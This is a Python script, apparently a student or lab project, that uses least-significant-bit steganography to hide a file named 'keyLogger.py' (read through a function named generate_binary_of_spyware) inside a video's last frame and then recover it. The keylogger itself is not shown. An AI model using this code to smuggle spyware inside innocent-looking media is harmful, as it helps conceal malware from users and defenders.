import cv2
import numpy as np



#EXTRACT FRAMES FROM THE VIDEO FILE
def extract_frames(vidfile):
	cap= cv2.VideoCapture(vidfile)
	i=0
	frames = []
	while(cap.isOpened()):
		ret, frame = cap.read()
		if ret == False:
			break
		frames.append(frame)
		i+=1

	cap.release()
	cv2.destroyAllWindows()
	return frames


#CONVERT THE MESSAGE INTO A BINARY STRING
def generate_binary_of_spyware():
	with open('keyLogger.py', 'r') as f:
		characters = f.read()
		binary = ''
		for i in range(len(characters)):
			# print(characters[i])
			# print('{0:08b}'.format(ord(characters[i]), 'b'))
			binary += '{0:08b}'.format(ord(characters[i]), 'b')
	return binary



# #FUNCTION FOR HIDING MESSAGES IN AN IMAGE
# def hide_in_image(image, b):
# 	# x,y,z = lastframe.shape
# 	c = 0
# 	# print(len(b))
# 	for i in range(720):
# 		for j in range(1280):
# 			for k in range(3):
# 				# index = ((i*1280 + j)*3 + k)
# 				# print((i*1280 + j)*3 + k)
# 				if c == len(b):
# 					# if image[i,j,k] % 2 == 0:
# 					# 	image.itemset((i,j,k), image.item(i,j,k) + 1)
# 					break
# 				# print(e)
# 				if b[c] == '0' and (image.item(i,j,k) % 2) != 0:
# 					image.itemset((i,j,k), image.item(i,j,k) + 1)
# 					# print(x)
# 				if b[c] == '1' and (image.item(i,j,k) % 2) == 0:
# 					image.itemset((i,j,k), image.item(i,j,k) + 1)
# 					# print(x)
# 				c += 1

# 	# print(c)
# 	return image, len(b)


# FUNCTION FOR HIDING THE MESSAGES IN A VIDEO
def hide_in_video(lastframe, b):
	# x,y,z = lastframe.shape
	c = 0
	for i in range(720):
		for j in range(1280):
			for k in range(3):
				if c == len(b):
					break
				# print(e)
				if b[c] == '0' and (lastframe.item(i,j,k) % 2) != 0:
					lastframe.itemset((i,j,k), lastframe.item(i,j,k) - 1)
					# print(x)
				if b[c] == '1' and (lastframe.item(i,j,k) % 2) == 0:
					lastframe.itemset((i,j,k), lastframe.item(i,j,k) - 1)
					# print(x)
				c += 1
	return lastframe, len(b)


# #USING THE IMAGE, EXTRACT THE HIDDEN MESSAGE
# def extract_from_image(image, msglen):
# 	b = ''
# 	it = 0
# 	for i in range(720):
# 		for j in range(1280):
# 			for k in range(3):
# 				if it == msglen:
# 					break
# 				# index = ((i*1280 + j)*3 + k)
# 				# if index % 8 == 0 and image[i,j,k] % 2 != 0:
# 					# break
# 				# elif index % 8 == 0 and image[i,j,k] % 2 == 0:
# 					# continue
# 				# elif index % 8 != 0:
# 				if(image.item(i,j,k) % 2 == 0):
# 					b += '0'
# 				else:
# 					b += '1'
# 				it += 1
# 	# print(extracted_binary)
# 	# print(type(extracted_binary))

# 	return b


# USING THE LAST FRAME OF THE VIDEO, EXTRACT THE HIDDEN MESSAGE
def extract_from_video(last, msglen):
	b = ''
	it = 0
	for i in range(720):
		for j in range(1280):
			for k in range(3):
				if it == msglen:
					break

				if(last.item(i,j,k) % 2 == 0):
					b += '0'
				else:
					b += '1'

				it += 1
	# print(extracted_binary)
	# print(type(extracted_binary))

	return b


# STORE THE EXTRACTED HIDDEN MESSAGE IN A FILE
def store_in_file(filepath, b):
	file = ''
	for i in range(int(len(b)/8)):
		bits = ''
		for j in range(i * 8,i * 8 + 8):
			bits += b[j]
		char = chr(int(bits,2))
		file += char
		# print(char)

	# print(file)
	with open(filepath, 'w') as f:
		f.write(file)



# VERIFY WHETHER THE BINARY STRING GENERATRED AND THE STRING EXTRACTED ARE EQUAL
def verify(b1, b2):
	if b1==b2:
		return True
	else:
		return False

if __name__=='__main__':
	#FOR_IMAGE

	# binary_of_msg = generate_binary_of_spyware()
	# # print(binary_of_msg)
	# img = cv2.imread('withoutHiddenMsg.png')
	# new_img, length = hide_in_image(img, binary_of_msg)
	# # print(new_img)
	# cv2.imwrite('withHiddenMsg.png', new_img)
	# # print('-------------------------------------------------------------')
	# img2 = cv2.imread('withHiddenMsg.png')
	# extracted = extract_from_image(img2, length)
	# # print(extracted)

	# result = verify(extracted, binary_of_msg)
	# print(result)

	# store_in_file('recovered.py', extracted)

	#FOR_VIDEO

	frame_list = extract_frames('custom.avi')
	binary_of_msg = generate_binary_of_spyware()
	lastFrame, msgLength = hide_in_video(frame_list[-1], binary_of_msg)
	frame_list[-1] = np.copy(lastFrame)
	#print(frame_list[-1])
	# print(binary_of_msg)
	# print('-------------------')
	# print(extracted_binary)
	width = 1280
	height = 720
	out = cv2.VideoWriter('msgHidden.avi', cv2.VideoWriter_fourcc(*'HFYU'), 1, (width, height))
	# print(type(out))
	# frames = record_video(5, cap)
	for frame in frame_list:
		# print(frame)
		out.write(frame)
	out.release()

	newVideoFrames = extract_frames('msgHidden.avi')
	#print(newVideoFrames[-1])
	extracted_binary = extract_from_video(newVideoFrames[-1], msgLength)
	check = verify(extracted_binary, binary_of_msg)
	print(check)

	# fra = extract_frames('msgHidden.avi')
	# print(fra)
# print(len(binary_list))
# print(len(binary))
# print(type(binary_list[i]))
